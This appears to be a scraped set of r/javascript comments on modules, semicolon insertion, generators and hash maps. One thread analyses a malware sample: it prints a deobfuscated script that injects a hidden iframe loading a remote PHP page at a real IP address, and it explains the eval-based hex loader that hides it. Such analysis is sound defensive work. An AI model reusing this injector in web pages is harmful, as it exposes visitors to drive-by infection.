I've said it is a half-baked solution because namespaces don't solve modularity problems, which is what modules solve. So trying to use namespaces alone to solve modularity doesn't work. I never said namespaces and modules can't coexist, quite the opposite, actually. Patterns *are* bad, because they're patterns (conventions). Conventions are something you sometimes need because of social implications (for people). However, abstractions beat conventions because then, instead of presenting people with a bunch of crap saying "Oh, and all this means just this particular thing, and I've named it The X Pattern", you just express your intent instead. So: for (i = 0; i &lt; xs.length; ++i) ys[i] = f(xs[i]) // is a pattern xs.map(f) // is an abstraction Notice that when you abstract, you only keep the things that are quintessential to express what's being done. You don't care about how it's being done, or what's going underneath, or what particular structure it uses, you just refer to the concept itself, right in your code.
I understand modules are not files, but quite often projects equate to a single module per file. require pulls in a single object, that object may have modules under it but it's also a module on it's own and I believe node's module loading means you can only define one module (or at least a single object containing modules) per file with exports (I may be wrong here). what you're doing with putting in a require in the code is explicitly setting that you want 'bar' and it's up to require to decide what 'bar' is. That stops anyone else from putting in a new module that shares the same interface with 'bar' unless they override require. require is a function people know now and overriding it won't be something the user expects. Contrast this with passing something in, then you know it's something that was built elsewhere and can go look up the internals if you want. I know it's not explicitly defined what those modules should be, but that can be handled in comments (jsdoc) that define the interface being passed in. This is probably better than defining 'bar' because you have the definition of what 'bar' is rather than having to go look up the 'bar' module. So you lose flexibility with explicitly defined require statements. With DI you gain general components that are easy to compose and using JSDoc you let the user know what each module can do rather than assuming they know. If anything the code will be easier to read especially if they don't know the signature of the module you are loading
Indeed, node modules map a single file to a single module object. And this is fairly okay. But as I said before, **module loading is a separate problem**. You don't even need a module loader to have first-class parametric modules, so I'm not even sure what you're arguing here. Your second paragraph makes no sense. If you have parametric modules, you don't **use require('foo')**, so the module loader doesn't even gets into the scene. No one needs to redefine `require`, you just need to accept the dependencies as a parameter of your module instead of `require`-ing it. // foo.js module.exports = function(stack) { stack.push(1) } // main.js console.log(require('foo')([])) // =&gt; 1 In this case, `[]` is a module. It's not being loaded from any file. And you could pass anything that fulfilled the interface that is required by the `foo` module.
Sir, I believe you're conflating the meanings of convention and abstraction. When you have an abstraction, the abstraction itself conveys the meaning. In this case, map conveys the meaning of **what is being done** — transforming the items of a particular list by way of a mapping function. If you compare it with the `for` convention, it does the same, conveys the same meaning, but that meaning also comes with lot of boilerplate specifying how that particular operation is being carried. In languages without first-class and higher-order functions, this would be the only way, and you'd have to go to every programmer in your team and say: "This is a map." — with an abstraction, your code says that for you, even if the other programmers are not familiar with the terminology and conventions.
I love Array.isArray(), but have to support some old browsers (IE 7/8).
**No.** // CodeAcademy says "All of these statements can end with a ; but none of them must." // Ok, let's try it! var sayHello = function() { alert('Hello!') } // But let's also define an immediately executing function expression (function() { var message = 'Starting!' alert(message) }()) What happens? First the browser alerts "Starting!", then it alerts "Hello!". Looking at the code, that's not *at all* what you would expect to happen, despite the fact that we followed all of CodeAcademy's rules! How do you fix this? Use a semicolon after the assignment statement: var sayHello = function() { alert('Hello!') }; Semicolons are not optional. As a result of automatic semicolon insertion, it may appear that they can be omitted, but this can result in unexpected behavior.
1. find a nice point in rectangle checking function. 2. calculate the potential rectangle for "dude" after movement 3. check all 4 points that make up dude's rectangle against each wall with the point in rectangle function 4. if they are all false then let dude move
I think I have learned one more thing to abuse in JavaScript.
Thank you for this down to the ground article.
Just use a polyfill: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/isArray#Compatibility Or use https://github.com/kriskowal/es5-shim
Everything that guy comes up with is *amazing*. Really outstanding work.
You were at the angularjs meet at google yesterday, weren't you?
It's a lot easier to remember where you need to put a semicolon than to research and remember all the edge-cases where ASI could break. I'll stick with putting these `;` everywhere, I like them.
Trying to blur the differences between the backend and the frontend with Node.js as the platform is doing more harm than good. Every point that has been made here is valid. And in regards to node, it is a no brainer that this is the way to go. But in the frontend, ultimately you have a build operation. Which bundles all your modules / files into **one single FILE**. Everything you've written exists in that built-file. That fact, renders a lot of the discussion points re DI, modularity, etc moot. Now don't get me wrong, i am not suggesting we let go of any of the best practices or that X is better than Y. It's just the lack of acknowledgement of that fact that bugs me. 
Another way that ASI can mess things up: console.log('hi') [1,2,3,4].reduce(function(a,b){return a+b}); Will throw: TypeError: Cannot read property '4' of undefined This is because it will see the opening `[` and treat it as lookup up the `4` property ([because of the comma operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Comma_Operator)) of the return value of `console.log` – more or less, `console.log('hi')[4]`. There is a large handful of places where ASI might have unintended consequences, and anyone who decides to rely on it [should really have a very strong understanding of all the rules](http://www.ecma-international.org/ecma-262/5.1/#sec-7.9.1). Personally, I'd rather just use semicolons and not have to think about it.
&gt; When do you need a semicolon? Don't ask, just add it.
This discussion again? C'mon...
I think this is not really about the code he presented - but the comments in which he tries to sound like a cool guy - while he sounds like a jerk, because what he points out are not the flaws of the language but its features. It is like these folks who offend js for lack of a classical inheritance while the truth is they have no idea how to wrap their mind around prototypes.
There is no such thing as **optional** semicolon. Unless you want to fail during file minifaction.
The article makes a good point: `yield` prevents parallel asynchronous actions. On the other hand, asynchronous actions can produce really difficult-to-understand code. I'd rather write: tx(function* () { var profile = yield fetch.profile(), details = yield fetch.details(profile.details.id), activity = yield fetch.activity(profile.activity.id), matches = yield fetch.matches(details), permissions = yield fetch.permissions(currentUser.id), // etc... response.json(jsonViewModel); }); Than the equivalent spidery asynchronous code (promises included!). Write it to be obvious, optimize if you have a problem.
Thanks for mentioning my blog! Three advanced posts to get started: * [Object properties in JavaScript](http://www.2ality.com/2012/10/javascript-properties.html) * [Arrays in JavaScript](http://www.2ality.com/2012/12/arrays.html) * [Categorizing values in JavaScript](http://www.2ality.com/2013/01/categorizing-values.html)
Hmm, what version of Chrome are you using? Your result makes more sense, but I don't see that even with Canary.
I watched a video of a British lady giving a presentation doing this exact same thing about two months ago...
Sure, but the only step that could potentially take some substantial time is waiting for the response and you can't really show any progress for that because you don't know how long it will take.
And more: http://esprima.org/test/compare.html esprima and uglify seem to have a rather similar performance profile nowadays, while traceur and acorn are significantly faster. 
Nice article. I use hash maps / object collections all the time in game programming in js. They work wonderfully for space partitioning, instant object retrieval, etc. One of the ways I just implemented one was to assign the "key" as a comma delimited string of geometry coordinates. Until I started using this, I would have had to iterate through an array of objects by index to find a particular object that met specific coordinates, now all I have to do is something along the lines of hash.get("0,5"), works perfectly (oversimplified).
Interesting, thanks. I think the performance differences are likely due to the intended uses, since some (the fastest) are very narrow in their purpose, while the others handle quite a few different kinds of tasks. This may relate to the warning on the page about the results not being an equal apples:apples comparison. And the tests don't seem to work in IE, go figure lol...just saying _"Running..."_ on the first test (for 5+ mins now).
I'm glad you like it! Well that's exactly how hash maps work. When I was messing about with games in C++ I was looking for familiar ground that I was used to in JavaScript. I built a game of life that stored it's grid in a hash map in the *exact* same way as you did. It works really well. The only point my post would have on improving that is adding a `toString` method to your objects so you can use `grid[cell]`. I just love that style of syntax, being able to just pass a reference to an object as a key.
I made my points in the comments of the article. Ultimately, it's an issue of style and stack preferences. There's no doubt that we need to author modular code and make our lifes easier.
&gt;Semicolons are not optional. Sorry, you are just plain wrong about that. Semicolons are optional in JavaScript so long as you follow a few simple rules. Decreeing that semicolons are mandatory is a sign of superstitious coding, and that is worse than actually knowing how to code JavaScript. Learn how ASI works and you won't need to worry about semicolons. Lines beginning with [ or ( need to have a semicolon on the preceding line. That really is all there is to it. I personally don't use [ or ( at the start of any lines of JavaScript, that is just my coding style so I never run into problems with ASI at all. The people who panic and worry about missing semicolons do not know the rules and put in semicolons superstitiously. 
Lines beginning with [ or ( need to have a semicolon on the preceding line. That really is all there is to it.
Minifying and concatenating javascript presents no problems if you know how ASI works and that is quite simple: Lines beginning with [ or ( need to have a semicolon on the preceding line. That really is all there is to it.
That's what made me insta-close the site again.
I've been minifying javascript without semicolons for years. Your assumption is incorrect given that you actually know how ASI works. In fact, a good minifier will strip out semicolons when possible. Lines beginning with [ or ( need to have a semicolon on the preceding line. That really is all there is to it. 
It is a poorly obfuscated code of this: function zzzfff() { var pzzl = document.createElement('iframe'); pzzl.src = 'http://198.66.172.47/mq9KGn46.php'; pzzl.style.position = 'absolute'; pzzl.style.border = '0'; pzzl.style.height = '1px'; pzzl.style.width = '1px'; pzzl.style.left = '1px'; pzzl.style.top = '1px'; if (!document.getElementById('pzzl')) { document.write('&lt;div id=\'pzzl\'&gt;&lt;/div&gt;'); document.getElementById('pzzl').appendChild(pzzl); } } function SetCookie(cookieName, cookieValue, nDays, path) { var today = new Date(); var expire = new Date(); if (nDays == null || nDays == 0) nDays = 1; expire.setTime(today.getTime() + 3600000 * 24 * nDays); document.cookie = cookieName + "=" + escape(cookieValue) + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : ""); } function GetCookie(name) { var start = document.cookie.indexOf(name + "="); var len = start + name.length + 1; if ((!start) &amp;&amp; (name != document.cookie.substring(0, name.length))) { return null; } if (start == -1) return null; var end = document.cookie.indexOf(";", len); if (end == -1) end = document.cookie.length; return unescape(document.cookie.substring(len, end)); } if (navigator.cookieEnabled) { if (GetCookie('visited_uq') == 55) {} else { SetCookie('visited_uq', '55', '1', '/'); zzzfff(); } } Basically it makes a small iframe which possibly contains the malicious content. P.S. It seems that the site 198.66.... is hacked too. (Do not go to that site.)
How about [jQuery UI Accordion Widget](http://jqueryui.com/accordion/)?
thanks. may i ask how you were abot to deobsfucate is successfully? This is my first time dealing w/ something like this and I would like to move forward. Thanks!
The very long string `17,5d,6c,65,5a,6b,60,66,65`... clearly indicates that it is a hex encoding of a source code, possibly evaluated by using evil `eval` function. What I had to do was just execute the code after replacing `za(s)` to `console.log(s)`. However, to be safe, I looked at the code. By using [JSBeautifier](http://jsbeautifier.org/), the code can be made easy to be read. bv = (5 - 3 - 1); aq = "0" + "x"; sp = "spli" + "t"; ff = String.fromCharCode; w = window; z = "dy"; try { document["\x62o" + z]++ } catch (d21vd12v) { vzs = false; v = 123; try { document; } catch (wb) { vzs = 2; } if (!vzs) e = w["eval"]; if (1) { f = "A_VERY_LONG_STRING" [sp](","); } w = f; s = []; for (i = 2 - 2; - i + 1331 != 0; i += 1) { j = i; if ((0x19 == 031)) if (e) s += ff(e(aq + (w[j])) + 0xa - bv); } za = e; za(s) } There are some obvious things to be simplified. bv = 1; aq = "0x"; sp = "split"; ff = String.fromCharCode; w = window; z = "dy"; try { document["\x62o" + z]++ } catch (d21vd12v) { vzs = false; v = 123; try { document; } catch (wb) { vzs = 2; } if (!vzs) e = w["eval"]; if (1) { f = "A_VERY_LONG_STRING" [sp](","); } w = f; s = []; for (i = 0; i != 1331; i += 1) { j = i; if ((0x19 == 031)) if (e) s += ff(e(aq + (w[j])) + 0xa - bv); } za = e; za(s) } `document["\x62o" + z]` is `document.body`. Since `document.body++` tries to set the value of `document.body` to something not an DOM object, it will raise an error. Therefore, the first `catch` clause will always be executed. And, `document;` will never raise an error. Therefore, the second `catch` clause will not be executed. `0x19` (hex) and `031` (oct) are both 25. Therefore, `0x19 == 031`. Like this, a lot of the code can be eliminated. w = "A_VERY_LONG_STRING" ["split"](","); s = []; for (i = 0; i != 1331; i += 1) { s += String.fromCharCode(window["eval"]("0x" + w[i]) + 9); } window["eval"](s) In JavaScript, `a.b` is equal to `a["b"]` and vice versa. And, `window["x"]` is equal to `x`. (This statement is simplified and not actually true.) w = "A_VERY_LONG_STRING".split(","); s = []; for (i = 0; i != 1331; i += 1) { s += String.fromCharCode(eval("0x" + w[i]) + 9); } eval(s) Now, it is clear that `w` holds the array of code represented in hex code (with offset 9), and the code just converts it to the string and evaluates it. I think the purpose of these obfuscations are for preventing some analysis, since if one just naively runs the code (outside of the browser environment), either `window` or `document` would not exist and this code will 'not work'. Edit: Thanks for the guy who gave me the gold!
key thing is to follow through where the eval() is. the last eval there (that is hidden in the za variable) - change that to document.write(s). then run that - you'll get the output instead the eval of the output. I use a tool called Malzilla... but it looks like it does much the same thing as the other guys JSBeautifier.
Looks like a lot of people are interested in this, been getting some good submissions and a fair amount of traffic from you all. If anyone has any feedback we'd love to hear it. We have less than 2 weeks remaining on our fundraising and could really use your help to make this possible. [Check out the fundraiser](http://igg.me/at/diodome) and help make it a reality. 
I've also made sprite libraries from hash collections, it's a wonderful thing having it check for you if a sprite exists and returning it instantly. In the case of bullets, let's say hundreds on the screen at once, you just can't beat it for speed vs. iteration or worse context line drawing.
&gt;on the preceding line Ok, but we use semicolons as terminators, right? At the end of statements? I just don't want that confusion (and I have many years of javascript experience), I *really* don't want newcomers to think about things like that. ASI is a nice feature that makes javascript better and less scary for beginners (i.e. stuff doesn't break as easily, which is *awesome*) - I'd love to have that feature in more languages. But I don't want newcomers to learn the in and outs of ASI (EDIT: Ok, maybe it's not *that* complicated, but still need the discipline of looking for things on 'preceding' lines, starting out with JS is hard enough). Need to leave room in the brain for more important quirks and thankfully webdev has plenty of that :)
jQUI accordion widget will do exactly that. Pass in `active: false, collapsible: true` options and it will start with all sections closed. As for not using a fixed height, check out the "no auto height" example, which shows you the relevant option. Go look through the examples and read through [the API documentation](http://api.jqueryui.com/accordion/). I can whip up a jsfiddle demonstrating it if you get lost.
Just a heads up; AVG did not let me load this page lol. It was detecting it as malware; and was preventing the page from loading.
The [ECMAScript language specification](http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf) states that semicolons are inserted when encountering tokens that are not allowed by any production of the grammer (subject to a few rules). According to that statement, when you omit semicolons, you are writing code that does not match the grammar of ECMAScript. If you've taken a compiler design or theory of computing class, you know that means **your code doesn't parse**. Yes, there is a mechanism called automatic semicolon insertion that attempts to fix your non-parsing code, but why are you writing code that doesn't parse in the first place? Is it to make your code look cooler? Is it because you want to save keystrokes? Is it because you want to show other coders that you're a JavaScript expert? Are any of these valid reasons to potentially compromise the reliability of your code? Now, allow me to address your statements directly. &gt;Lines beginning with [ or ( need to have a semicolon on the preceding line. That really is all there is to it. Wrong. You missed a case. var THINGS_TO_EAT = ['apples', 'oysters', 'sprayOnCheese'] -1 == resultOfOperation() || die(); I'm sorry to break it to you, but it seems you don't know the rules as well as you thought. This is why we use semicolons. &gt;The people who panic and worry about missing semicolons do not know the rules and put in semicolons superstitiously. To write code that is valid according to the grammar of the language is not superstitious. &gt;I personally don't use [ or ( at the start of any lines of JavaScript, that is just my coding style so I never run into problems with ASI at all. Your statement seems to imply that you **never** work on projects with other coders, which surely isn't the case. In the real world, we work on large projects with dozens of other engineers with varying coding styles. We put our personal style aside and conform to [a style guide](http://google-styleguide.googlecode.com/svn/trunk/javascriptguide.xml?showone=Semicolons#Semicolons) designed to keep our code readable and reliable. We don't write code a certain way because it "looks cool" and we're not worried about "saving a keystroke" if it means our code could behave unexpectedly.
I mean this reddit page.
Version 27.0.1453.110 m on Windows 8 64-bit
It is likely checking operating systems, browsers, etc and serving up malware only if your system is vulnerable.
&gt; they won't work magically as you expect! I don't know how the author thinks people expect generators to behave, but I've always thought that the execution state of a generator function is suspended at each yield. function* gottaCatchEmAll(fileN) { for (var i = 0; i &lt; arguments.length; i++) { yield arguments[i]; } } For example I would have assumed that the for loop would be literally paused at each loop iteration, until someone calls next(). Is that not the case?
I actually first stumbled on the live event with the game developers scheduled for tomorrow: https://developers.google.com/live/shows/713739702
This isn't flexibility. It's just a bunch of quirky implementation details. Putting something at "index" `NaN` or 3.5 isn't any useful. People do this kind of thing occasionally, but it's generally a mistake and they would have preferred if they would have been notified.
Yeah but if there were no Black hats, we wouldnt need to worry bout security. 
[seriously?](http://i.imgur.com/WP2wYGF.gif)
Isn't that like saying, - our police force would be nowhere without rapists - Dentistry would be nowhere without coca cola you get the drift...
About these being slower: well, no kidding, they're new! The goal was to get these in quickly, not make them super fast. This is a language feature that is still under development for ES6 and feedback from implementers and developers is extremely critical.
this intrigued me... tnx
I can’t believe no one mentioned [kangax’s Perfection Kills blog](http://perfectionkills.com/) yet. He has some very in-depth write-ups on various JavaScript/DOM-related quirks — highly recommended! I also write about JavaScript every now and then: http://mathiasbynens.be/notes#javascript Required reading (IMHO): * [JavaScript’s internal character encoding: UCS-2 or UTF-16?](http://mathiasbynens.be/notes/javascript-encoding) * [JavaScript character escape sequences](http://mathiasbynens.be/notes/javascript-escapes). * [Bulletproof JavaScript benchmarks](http://mathiasbynens.be/notes/javascript-benchmarking) 
 if (navigator.cookieEnabled) { if (GetCookie('visited_uq') == 55) { } else { SetCookie('visited_uq', '55', '1', '/'); zzzfff(); } } This code performs the hack only if your navigator accepts cookies. Once it's done, it creates a cookie to not attack you anymore.
I've had similar feedback from others and this'll be something I need to work on. There no need to rely on CSS at all and I need to remove these dependencies. As for the JS, I use: * JQuery for DOM manipulation. * JQuery UI for the autocomplete on the text box. * Lodash for several functional programming idioms and other useful methods. * Modernizr to detect HTML5 localstorage support. I'm very new to Javascript - what would you recommend I do about each of the above points? * For JQuery, I'd like just to say "give me any DOM manipulation library you like, and I'll use it". * For JQuery UI there's no excuse, I need to make this optional and rip it out. * For Lodash...I'd like to keep using it! Do Javascript programmers frown upon re-using other Javascript libraries? * For Modernizr, the same argument as Lodash. ...or, you tell me: how would you structure the code and API of this type of project? Thanks for your feedback! I appreciate constructive feedback.
Hmm, if I were more evil minded I'd distil the source of this exploit down to as few characters as required to still trigger AVG then paste them in a hidden link in all my reddit comments. That'd really confuse people (and the reddit admins too no doubt once people start reporting it).
The reason why those indices work is exactly because of JavaScript's flexibility and simplicity. Rather than being a completely different data type, an Array is just a special Object that inherits from Array.prototype and has a length property equal or greater to the array's highest natural number index. This means that you can do anything with it that you can with an object, including setting string keys outside of the natural numbers. This kind of behaviour is often useful for metadata, or setting keys like -1 that won't be included in array iteration. Rather than having arrays that are limited objects, JS arrays are *extended* objects.
I think I've only seen eval used for legitimate purposes once or twice; it seems to get used way more often for crap like this.
(Assume that "the opening `(` and the closing `)`" does not means `()`) The purpose of surrounding parens in `(function(){ ... }());` is *not* for denoting that this function is immediately executed. What the code do is just executing a function `function(){ ... }` right after it is created, something like `var foo = function(){ ... }; foo();`. Surrounding parens exist for distinguish it (function expression) from function declarations. If there was no parens, the parser would recognize it as a function declaration which requires the name of the function and can't be called immediately. Compare these three codes: function x(i){alert(i)}(1+1) (function x(i){alert(i)}(1+1)) +function x(i){alert(i)}(1+1)
Almost no difference in Chrome.
I made this! It's a small library for writing functions that accept varying types of arguments; Funnel.js will map them for you, and optionally transform them before they are injected into your function. It's really convenient when writing public APIs and such. Hope you guys like it; I'm looking for feedback to improve it.
You want to minimize dependencies so people who aren't already using Lodash, Modernizr etc.. don't have to pick it up just to use your component. Typically what you would want here is jQuery + jQuery UI (core components) as the dependency (this is common for jQuery widgets). If you need the jQuery UI auto-complete then leave it, but make that explicitly known. You need to drop Modernizr for sure, and just use a semi-safe technique such as if(window.localstorage === undefined) { // there is no localstorage } Lodash / underscore is where you need to make a choice. Your plugin is definitely more compelling without the dependency. Also, I would try looking at Qunit or Jasmine for unit testing.
Thanks for the feedback! It's good to know I need to drop Modernizr and that it's OK to depend on jQuery and parts of jQuery UI, as long as I make it explicitly known. I'm a bit torn about dropping Lodash, but I see where you're coming from. I might make a simple, automated deployment script that rips out the parts of Lodash I need and then shove it into my module's namespace, then internally create an underscore for myself. It's good to know that I should look at Qunit and Jasmine for testing, this is a long-standing question of mine with respect to Javascript. Do you know how easy it is to integrate both into travis-ci?
You are a superstitious coder. Do you spend time addng semicolons to otherwise working javascript code? That is a sign of a superstitious coder. 
You are also a superstitious coder. Adding a semicolon because you aren't sure if leaving it off will cause a problem, is the hallmark of the superstitious coder. Do you go adding semicolons to otherwise working javascript? How much time do you waste on this superstition?
I'm not sure what problem this solves that can't be solved with vanilla js. this.setSize = Funnel ("width: number, height: number?, units: string?") .default(function height(width) { return width; }) .in("units", ["px", "em"]) .set(["width", "height"], function(units) { return this() + units; }) (function(width, height) { this.style.width = width; this.style.height = height; }); The api is hard to understand too. Looking at your example (above), I'm not sure what it's really doing. It's producing a function? or a Funnel object? What does that do? Can I call it? How would I even use this? Could I just do something like this instead? this.setSize = function(options) { var o = options || { }; o.units = o.units || 'px'; if(['px', 'em'].indexOf(o.units) === -1) throw new Error('invalid unit type'); if(o.width || o.width === 0) { this.style.width = o.width + o.units; } if(o.height || o.height == 0) { this.style.height = o.height + o.units; } } Thank you for your open source contribution, and your effort, I'm just trying to understand the goal. 
I've seen a simliar thing here: http://namesjs.markstickley.co.uk/. How do you think it compares?
I reccomend using a explicit hash() function to you can use toString() for printing the object nicely (for debugging). The binary search would be faster, but how would you sort the key array?
why is this on quora if it doesn't allow code snippets? I think there are probably better ways to program that example anyway, like having a single star as a custom element and putting it inside a container that controls how the stars interact
Your description seems straight-forward enough, but I have to agree with /u/Shark_Kicker that the example is confusing. .default(function height(width) { return width; }) What does that even do? Why would function *height* take a single argument, *width*, only to return it? I'm just going on the assumption that's a typo, and "function height" was supposed to be "function width"?
I see your point on the hash function. It does sound better despite the little bit of extra typing. I guess if you were going to use a binary search you could have a single array in for form of a sorted set. You could then search through that set of objects for the one containing the key. Then you could return the value that was also stored inside. It's definitely not as smooth as a hash table, but if you need your key to be a whole instance of an object, and not its hash, then it's probably the best way.
Why not use a more familiar syntax? type name = default, ... ('String foo = "bar", Number bats = 2')
The page doesn't contain the string "test". That's pretty odd since testing is one of Angular's biggest selling points.
How would you create a sorted set in JS? How would you tell that an arbitrary object isntance is greater than another?
&gt;I seriously never have had a problem with ASI, and as ar as I'm concerned, if you are having such problems, you are doing it wrong. Ah, but you see, I have never had a problem with ASI either because I use semicolons :) I still haven't heard *why* you don't use semicolons, but to each his own, and if this works for you, that's great.
Well that would rely on the objects you are using as keys implementing a `valueOf` method which could be used to compare them. Admittidly this would only work in certain situations and an object with a hash method will work a lot better 99% of the time.
As you can see on this fake website I made, there are mostly links that change the background color with a transition. But there is a specific link ("Talweg") that launches another script I have which changes progressively the background color from time to time. I would like to know how to stop that script when it is activated, meaning the user click on another link, which activate the other script (one time bgcolor changing).
http://jsperf.com/funnel-js-vs-vanilla
I wasn't looking for the word "test". I was looking for string "test". E.g. things like "testing" or "test-driven". The kind of thing you find if you use Ctrl+F. By the way, you forgot a quote character. You're a lousy hacker.
I wrote [something a bit like this](https://github.com/bebraw/annotate) a while ago. Note that when I say "bit" I mean it. :) Perhaps these two approaches complement each other somehow. The cool thing is that `annotate` is ridiculously easy to [fuzz](https://github.com/bebraw/annofuzz) thanks to the definition. Anyway, just thought you might be interested in seeing a bit different kind of approach. :)
I can't look at this example without WTF'ing. You have a function called height that takes a single argument width that does nothing but returns it. WTF?
As best as I can tell, since `height` is an optional argument (based on the `?`), the `height` function is used to set its default value. I guess the function gets passed the mandatory arguments (`width` in this case). So this example defaults `height` to the same value as `width`.
The type coercion already does that, and I guess that it would depend on what behavior you wanted. If you wanted different behavior for `undefined` vs `null` then, yeah, you'd need to check that.
Roughly, yes! Functions get passed any arguments they *ask for*; so you just have to list the arguments you need, and they are injected right into place.
Yes, some of this is right! First thing is, “funneled” functions accept a regular old argument list, as opposed to a single `options` object, like this: this.setSize(12, "em"); That means you don't get to name your arguments when calling; this is both a blessing (conciseness) and a curse (calls are less self-descriptive). The result is that it's better-suited for functions with fewer arguments, I'd say. To answer the first concern you raise—yes, what you get is an actual, honest-to-goodnest function. When you're done with a Funnel call, what you get is a regular function that you call just like any other, as shown above. In short, Funnel is there to do something that you could very well do yourself, but in a more concise and clearer manner. Instead of mixing the argument handling code with the actual function code, you can clearly separate the two; that also means that if you know the Funnel API, you'll be able to understand what a given function wants as arguments at a glance. How well I've met that goal is to be debated though, and I intend to keep on working on that.
&gt;&gt;defaults height to the same value as width. That's the sort of assumption/default that should be explicitly commented, methinks. 
Hmm. Names.js seems to be for when you want to explicitly name your arguments at call time; it maps an object that you pass as a parameter, to the regular argument list expected by the function. Funnel.js actually does kind of the contrary: you still call functions using unnamed, normal arguments, but Funnel.js resolves which argument is which based on their types. For instances, all those calls would work as expected (with the example funneled function, quoted by Shark_kicker above): this.setSize(10); // sets size to 10px, 10px this.setSize(10, "em"); // sets size to 10em, 10em this.setSize(10, 20); // sets size to 10px, 20px this.setSize(10, 20, "em"); // sets size to 10em, 20em Funnel.js looks at the types of the arguments and figures out how to map to what's expected in the signature.
Well, my goal was conciseness, and I guess I lost clarity in the process. Thing is, Funnel.js will look at the function names to determine what you're affecting (here, setting a default value). And it will execute the function itself to get a value (here, the “default value”). So: the code snippet you quoted says: “if the `height` argument is undefined, then set it to `width`”. This is because the function *asks for* width (by having `width` in its argument list, it gets injected automatically) and then directly returns it. Thus, this is used as a default value for `height`, because `height` is the name of the function. Basically, when you know what means what to Funnel, you can read very easily what's going on; but if you haven't been briefed, well, it's just plain confusing. I'm going to have to think about how to concisely introduce all this convoluted stuff!
That's a good point, yeah. I went with what felt most natural for me, and wanted to avoid equal signs (that I perceive as kind of heavy), but mostly, yes, I could have went with something like what you describe. I hope the signature syntax is clear enough anyway in the end.
It's like dukerutledge said, the vanilla function should be a lot more complex than that; thanks for the test though. I'll try and write an accurate test, but I don't expect the results to be a lot more favorable to Funnel. It definitely introduces overhead.
Oh, the goal is definitely the same! I'd say annotate has a more focused feature-set, and is a lot cleaner in return. No ugly strings to define types, I like that :)
Yeah, you're right. From the comments I'm getting a sense of what isn't clear in the intro, I'm definitely going to add more detail about what does what. (or do you mean in actual code, as opposed to simply example Funnel code?)
Hey, thanks for your comments everyone. I'm starting to get a better sense of what's clear and what's not. Until I update the GitHub page: **Funnel.js returns an actual real function!** You just call it normally. That's why you can funnel a function for a public API for instance, and never tell your API users, because they won't see a difference. **It works in funky, ambiguous situations!** In [the README example](https://github.com/Cykelero/Funnel.js), that Shark_Kicker quoted here, you can call setSize in those ways and it will work: this.setSize(10); // this will set the size to 10px, 10px. Both the height and unit have been omitted. this.setSize(10, 20); // 10px, 20px, as expected. But: this.setSize(10, "em"); // 10em, 10em! Funnel notices the second argument is a string, so it can't be the height; it's the unit, instead. And: this.setSize(10, 20, "em"); // Works too! And that's only a simple example; you can have signatures that are way more complex, and Funnel will figure them out anyway. There are a few examples in the [Overview](https://github.com/Cykelero/Funnel.js/blob/master/documentation/Overview.js). **You could do this by yourself, and Funnel is slower.** Yup! You'll have some overhead, so better use Funnel only for functions that aren't performance-critical. And you could handle the argument filtering yourself, but that would be a lot of ugly code, each time you want a smart function. **In filter functions (like `.default`), the function name tells Funnel what argument is affected, and the arguments are injected automatically.** This. It's handy but it looks very weird.
In this case, put it in the code. Especially since it's example code.
I'll definitely do that. You really weren't that far off though, so I'm happy about that.
I've never seen that trick with -1 before. While I generally approve of bit twiddling, I think I would prefer units = (["px", "em"].indexOf(units) == -1) ? "px" : units in this case. I like to get more than a few characters saved out of a potential WTF.
So is there no way to just make it so I can just search my own files and pull images from there? I'm just wanting to do a local test to get the logic down then convert it over.
Nope, not from browser. You can read user-specified files with the FileReader API, but not search the local file system.
I don't use semicolons because they are optional in javascript and I know how to code so that it *never* becomes an issue. I view semicolons in javascript as a pointless, superfluous, and unnecessary feature that people who like to nitpick use to make themselves feel better. Making sure that every line ends in a semicolon even where one isn't needed is roughly equivalent to washing your hands three times after using the bathroom. It's a bit OCD. Javascript works just as well without semicolons, provided you don't write foolish code. Leaving off semicolons isn't really 'typing less', it is not the keystrokes it saves that make it useful, it is just not having to think about adding semicolons where they won't make any difference at all, where they aren't required. I spend so much time coding javascript, and if I had to worry about every line having a semicolon I'd be wasting that time 99.999% of the time, because I *never* have any problems leaving out semicolons. I do believe that it accelerates my coding because I never have to think about semicolons at all. My code is still very easy to read, it bundles without errors. Mandatory semicolons in an ASI language are for [superstitious programmers](http://c2.com/cgi/wiki?SuperstitiousCode). If you think you have to add a semicolon at the end of every line of javascript, you are ignorant of the language and the cases where a semicolon isn't needed. If you have an imaginary assumption that semicolons are mandatory, then you do not know where they are needed. If you fear hidden bugs and add semicolons as a workaround, you're doing it wrong. Seriously, semicolons *are* optional. People need to get over the false assumption that semicolons in javascript are mandatory. 
I don't agree with the core concept of this. It encourages lazy programming and unpredictable results. Imagine inheriting a codebase that uses this throughout. What a nightmare.
Well, I only ever use `~` in conjunction with `indexOf`, so I see it as more of an idiom than unneeded bit twiddling (and I have seen it in multiple other codebases). I agree it could be confusing on initial viewing, though.
Even going to this self.javascript page fires my Antivirus into action!
*pseudo
Can you explain how it works?
Thank you, I fixed it in the readme file. Guess I should be more conscious of typos when copy pasting something in many places
Extremely easily. Look up the concept of anonymous modules.
Strange, since I can make console.log.valueOf = function () { alert("console.log.valueOf is triggered") } console.log | console.log and it does work
Thanks, that's pretty cool!
The reason it doesn't work is because of the way Javascript binds "this" var log = console.log; log("foo"); // error In that scenario, "this" of the log method is window instead of console. You would have to call log this way for it to work: var log = console.log; log.call(console, "foo") // good That explicitly binds "this" to console. jQuery provides a helper to create explicitly bound methods: var log = $.bind(console.log, console) log("foo"); // good
I think `console.log.bind(console)` instead of `console.log` may work.
This is a great example of how flexible JavaScript can be. Very cool project!
Modern browsers also give you Function.prototype.bind, so you can just do `console.log.bind(console)`. If you're already using jQuery and want to support older browsers then `$.bind` is still useful to avoid finding a polyfill, though.
Thanks for the info. I was needing to search through one specific folder, but since that constitutes the local file system, I won't be able to do that Dx
So it's basically a mediator like https://github.com/rhysbrettbowen/Nerve
Also removeLessThenThree should be removeLessThanThree
The world is filled with great ideas that will never catch on. Dart feels like it falls into this category.
doesn't work in firefox. Is it that hard to put in a detector to tell people it doesn't work on their browser.
This can be done without plugin easily: // main.js, when app first loads $(window).on('orientationchange', function(){ Backbone.trigger('orientationchange'); }); // myview.js var MyView = Backbone.View.extend({ initialize: function() { this.listenTo(Backbone, 'orientationchange', this.redraw); }, redraw: function(){ ... } });
Great read about the powers of emscripten
Good question
This is already natively built in to BB I thought.
&gt; I actually wouldn't even consider it a framework. Right, it's a library.
